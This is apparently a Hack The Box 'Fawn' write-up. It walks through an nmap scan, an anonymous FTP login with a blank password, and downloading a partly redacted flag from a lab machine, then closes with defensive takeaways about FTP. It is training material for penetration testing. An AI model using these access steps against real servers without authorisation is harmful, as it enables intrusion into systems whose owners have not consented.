HTB Writeup: Fawn
Difficulty: Very Easy

OS: Linux

Target IP: 10.129.24.134

# 1. Introduction
Fawn is the second machine in the "Starting Point" Tier 0. It focuses on enumerating and exploiting the File Transfer Protocol (FTP), specifically looking for misconfigurations like Anonymous Login.

# 2. Enumeration
Nmap Scan
We start by scanning the target to identify open ports and services.

Bash
nmap -sV 10.129.24.134
Results:

Port 21/tcp: Open (FTP)

Version: vsftpd 3.0.3

Critical Discovery: Nmap often flags if Anonymous FTP login allowed is active. This means we can log in without a unique pair of credentials.

# 3. Exploitation
FTP Anonymous Login
FTP allows a special username called anonymous. Usually, the password can be left blank or set to any string (like an email address).

Connect to the server:

Bash
ftp 10.129.24.134
Enter Credentials:

Name: anonymous

Password: (Press Enter)

Success! The server responds with 230 Login successful.

# 4. Retrieving the Flag
Once inside the FTP shell, we use standard Linux-like commands to navigate.

List files:

Bash
ftp> ls
Output: flag.txt

Download the flag:

Bash
ftp> get flag.txt
Exit FTP and read the file:

Bash
ftp> exit
cat flag.txt
Flag: 03542bb075191efxxxxxxxxxxxx

# 5. Summary & Key Takeaways
FTP Security: FTP sends data in plaintext. Even worse, allowing anonymous access to sensitive directories is a massive security risk.

vsftpd: This is a very common FTP daemon. Always check for version-specific exploits if anonymous login is disabled.

Basic Commands: Learned ftp, ls, and get.
